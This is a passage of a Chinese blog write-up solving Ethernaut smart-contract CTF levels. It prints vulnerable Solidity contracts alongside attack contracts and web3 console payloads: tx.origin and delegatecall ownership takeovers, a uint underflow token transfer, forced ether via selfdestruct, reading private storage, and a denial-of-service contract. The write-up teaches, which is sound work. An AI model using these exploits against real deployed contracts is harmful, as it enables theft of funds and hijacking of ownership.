class="params">address</span> =&gt;</span> uint) allocations;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* constructor */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Fal1out</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">allocate</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    allocations[msg.sender] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sendAllocation</span>(<span class="params">address allocator</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(allocations[allocator] &gt; <span class="number">0</span>);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">collectAllocations</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">    msg.sender.transfer(<span class="keyword">this</span>.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">allocatorBalance</span>(<span class="params">address allocator</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;看到没有第9行正儿八经的写着<strong>constructor</strong> 喵？定睛一看构造个瓜皮的函数，<strong>Fal1out()</strong> 这里不要被骗了，直接调用就可以了。  </p>
<blockquote>
<p>contract.Fal1out();  </p>
</blockquote>
<hr>
<h4 id="3-Coin-Flip"><a href="#3-Coin-Flip" class="headerlink" title="3. Coin Flip"></a>3. Coin Flip</h4><hr>
<h4 id="4-Telephone"><a href="#4-Telephone" class="headerlink" title="4. Telephone"></a>4. Telephone</h4><blockquote>
<p><strong>Target</strong>: 将owner变为自己  </p>
</blockquote>
<p>&emsp;&emsp;本题主要考察的是只能合约中tx.origin与msg.sender的区别，tx.origin是交易发起人，msg.sender是合约的上层调用地址。因此只需要用新合约包装一下地址就好了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Telephone</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">changeOwner</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (tx.origin != msg.sender) &#123;</span><br><span class="line">            owner = _owner;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line"></span><br><span class="line">    address target = <span class="number">0x811cb74F2FC520c64f7B44ac90d056c744f0Cf4d</span>;</span><br><span class="line">    Telephone c = Telephone(target);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hit</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">            Telephone c = Telephone(target);</span><br><span class="line">            c.changeOwner(msg.sender);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="5-Token"><a href="#5-Token" class="headerlink" title="5. Token"></a>5. Token</h4><blockquote>
<p><strong>Target</strong>: 将owner变为自己  </p>
</blockquote>
<p>&emsp;&emsp;这里主要考察uint的无符号整数的下溢,当uint为负数时，根据二进制的无符号表示法，此时数会变成一个极大的数，比如:  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uint a = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">a = a - <span class="number">2</span>;           <span class="comment">//此时a为ffffffff</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这在pwn中十分常见，因此我们可以构造payload，即:  </p>
<blockquote>
<p>contract.transfer(yourAddress,21);</p>
</blockquote>
<p>&emsp;&emsp;或者构造攻击合约：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) balances;</span><br><span class="line">    uint public totalSupply;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Token</span>(<span class="params">uint _initialSupply</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _value</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balances[msg.sender] - _value &gt;= <span class="number">0</span>);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _owner</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    address Tokens = <span class="number">0x0c65c7ec30d5d856958707fc8b958302ae689b49</span>;</span><br><span class="line">    Token target = Token(Tokens);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hit</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.transfer(msg.sender,<span class="number">21</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<hr>
<h4 id="6-Delegation"><a href="#6-Delegation" class="headerlink" title="6. Delegation"></a>6. Delegation</h4><blockquote>
<p><strong>Target</strong>: 将owner变为自己  </p>
</blockquote>
<p>&emsp;&emsp;这道题主要考察的是delegatecall()相关的知识，<strong>delegatecall()</strong> 与 <strong>call()</strong> 的区别是两者的上下文不同，delegatecall()的上下文是调用方，而call()函数的上下文则是实例本身。</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/eth_writeUp0.png?raw=true" alt="delegatecall()">  </p>
<p>&emsp;&emsp;我们来看一下合约代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Delegate</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Delegation</span>(<span class="params">address _delegateAddress</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(delegate.delegatecall(msg.data)) &#123;</span><br><span class="line">      <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;我们可以看到<strong>Delegation</strong>的<strong>fallback</strong>函数中存在<strong>delegatecall</strong>而且其中的参数可以修改，这个时候我们可以直接调用<strong>Delegate</strong>实例的<strong>pwn()</strong>函数，payload如下：  </p>
<blockquote>
<p>contract.sendTransaction({data:web3.sha3(“pwn()”)})  </p>
</blockquote>
<p>&emsp;&emsp;这个时候我们可以看到实例直接调用了非<strong>public</strong>的<strong>pwn</strong>函数,我们就实现了修改owner的操作。</p>
<hr>
<h4 id="7-Force"><a href="#7-Force" class="headerlink" title="7. Force"></a>7. Force</h4><p>&emsp;&emsp;这一题是要你给这个合约转钱，这里除了一只噬元兽什么也没有…乍一看挺懵逼的  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Force &#123;<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                   MEOW ?</span></span><br><span class="line"><span class="comment">         /\_/\   /</span></span><br><span class="line"><span class="comment">    ____/ o o \</span></span><br><span class="line"><span class="comment">  /~____  =ø= /</span></span><br><span class="line"><span class="comment"> (______)__m_m)         //马德 为什么这个猫变形了...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span>&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;要想给一个地址强行转钱，我们可以让一个合约自杀，然后钱就会被强行转入别的账户而且不能拒绝。所以我们就可以写个合约，随便打点钱，然后让他当场暴毙…好生刺激。   </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Force&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract payload&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">payload</span>(<span class="params"></span>) <span class="title">payable</span></span>&#123;&#125;</span><br><span class="line">    address addr_force = <span class="number">0x0ad6047bf65c599bf68fbbc0372c3923280f2a66</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hit</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        selfdestruct(addr_force);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这样一来，一执行hit()函数payload就凉凉，然后钱就打到了Force里面了，有没有一种舔狗的感觉…  </p>
<hr>
<h4 id="8-Vault"><a href="#8-Vault" class="headerlink" title="8. Vault"></a>8. Vault</h4><blockquote>
<p><strong>Target</strong>: 解锁  </p>
</blockquote>
<p>&emsp;&emsp;这道题主要考察了如何通过<strong>web3</strong>的<strong>web3.eth.getStorageAt()</strong>接口来查看区块上的信息。 </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Vault</span>(<span class="params">bytes32 _password</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    locked = <span class="literal">true</span>;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">bytes32 _password</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (password == _password) &#123;</span><br><span class="line">      locked = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;我们只需要通过<strong>unlock()</strong>函数就能修改locked的值，getStorageAt()的用法如下：  </p>
<blockquote>
<p>web3.eth.getStorageAt(addressHexString, position [, defaultBlock] [, callback])  </p>
</blockquote>
<p>&emsp;&emsp;我们需要使用一个回调函数来打印出相关数据：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(contract.address,<span class="number">1</span>,<span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = web3.toAscii(y);</span><br><span class="line">    alert(result);</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="9-King"><a href="#9-King" class="headerlink" title="9. King"></a>9. King</h4><blockquote>
<p><strong>Target</strong>: Be a king forever!!  </p>
</blockquote>
<p>&emsp;&emsp;先放源码：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract King is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  address public king;</span><br><span class="line">  uint public prize;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">King</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这个题目有点坑爹，他原本的目的是让你进行一次<strong>ddos</strong>攻击,在之前的版本中，我们可以使用<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="built_in">require</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> revert()</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> assert()</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;这三个函数主动抛出错误，这样一样就可以阻止<strong>transfer()</strong>的进行，但是在实施的时候我们发现这三个函数并没有阻止交易的进行，所以我们决定直接放弃编写fallback()从而进行拒绝服务攻击。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract fuck&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fuck</span>(<span class="params"></span>) <span class="title">payable</span></span>&#123;</span><br><span class="line">        address king_addr = <span class="number">0xc48b3899a3a594b170404855De1B0bDA2d0aec1c</span>;</span><br><span class="line">        king_addr.call.value(<span class="number">1.01</span> ether)();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gg</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        selfdestruct(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>gg()完全是为了以防钱提不出来，留个后手。  </p>
</blockquote>
<hr>
<h4 id="15-Naught-Coin"><a href="#15-Naught-Coin" class="headerlink" title="15.Naught Coin"></a>15.Naught Coin</h4><blockquote>
<p><strong>Target</strong>:取出合约中player所对应的balances  </p>
</blockquote>
<p>&emsp;&emsp;这里的balances实际上是一个token，作者重写了transfer()方法，但是他的源码不见了，我在github上找到了之前的版本：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"./BasicToken.sol"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">"./ERC20.sol"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @title Standard ERC20 token</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @dev Implementation of the basic standard token.</span></span><br><span class="line"><span class="comment"> * https://github.com/ethereum/EIPs/issues/20</span></span><br><span class="line"><span class="comment"> * Based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract StandardToken is ERC20, BasicToken &#123;</span><br><span class="line"></span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256)) internal allowed;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * @dev Transfer tokens from one address to another</span></span><br><span class="line"><span class="comment">   * @param _from address The address which you want to send tokens from</span></span><br><span class="line"><span class="comment">   * @param _to address The address which you want to transfer to</span></span><br><span class="line"><span class="comment">   * @param _value uint256 the amount of tokens to be transferred</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    address _from,</span></span></span><br><span class="line"><span class="function"><span class="params">    address _to,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint256 _value</span></span></span><br><span class="line"><span class="function"><span class="params">  </span>)</span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span> (<span class="params">bool</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(_value &lt;= balances[_from]);</span><br><span class="line">    <span class="built_in">require</span>(_value &lt;= allowed[_from][msg.sender]);</span><br><span class="line">    <span class="built_in">require</span>(_to != address(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    balances[_from] = balances[_from].sub(_value);</span><br><span class="line">    balances[_to] = balances[_to].add(_value);</span><br><span class="line">    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);</span><br><span class="line">    emit Transfer(_from, _to, _value);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.</span></span><br><span class="line"><span class="comment">   * Beware that changing an allowance with this method brings the risk that someone may use both the old</span></span><br><span class="line"><span class="comment">   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this</span></span><br><span class="line"><span class="comment">   * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:</span></span><br><span class="line"><span class="comment">   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729</span></span><br><span class="line"><span class="comment">   * @param _spender The address which will spend the funds.</span></span><br><span class="line"><span class="comment">   * @param _value The amount of tokens to be spent.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address _spender, uint256 _value</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    allowed[msg.sender][_spender] = _value;</span><br><span class="line">    emit Approval(msg.sender, _spender, _value);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * @dev Function to check the amount of tokens that an owner allowed to a spender.</span></span><br><span class="line"><span class="comment">   * @param _owner address The address which owns the funds.</span></span><br><span class="line"><span class="comment">   * @param _spender address The address which will spend the funds.</span></span><br><span class="line"><span class="comment">   * @return A uint256 specifying the amount of tokens still available for the spender.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">allowance</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    address _owner,</span></span></span><br><span class="line"><span class="function"><span class="params">    address _spender</span></span></span><br><span class="line"><span class="function"><span class="params">   </span>)</span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">view</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span> (<span class="params">uint256</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> allowed[_owner][_spender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * @dev Increase the amount of tokens that an owner allowed to a spender.</span></span><br><span class="line"><span class="comment">   * approve should be called when allowed[_spender] == 0. To increment</span></span><br><span class="line"><span class="comment">   * allowed value is better to use this function to avoid 2 calls (and wait until</span></span><br><span class="line"><span class="comment">   * the first transaction is mined)</span></span><br><span class="line"><span class="comment">   * From MonolithDAO Token.sol</span></span><br><span class="line"><span class="comment">   * @param _spender The address which will spend the funds.</span></span><br><span class="line"><span class="comment">   * @param _addedValue The amount of tokens to increase the allowance by.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里我们可以看到transcationFrom()方法并没有被重写，因此我们可以直接调用，但是需要授权。</p>
<p>&emsp;&emsp;接下来看一下题目代码：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/token/ERC20/StandardToken.sol'</span>;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is StandardToken &#123;</span><br><span class="line"></span><br><span class="line">  string public constant name = <span class="string">'NaughtCoin'</span>;</span><br><span class="line">  string public constant symbol = <span class="string">'0x0'</span>;</span><br><span class="line">  uint public constant decimals = <span class="number">18</span>;</span><br><span class="line">  uint public timeLock = now + <span class="number">10</span> years;</span><br><span class="line">  uint public 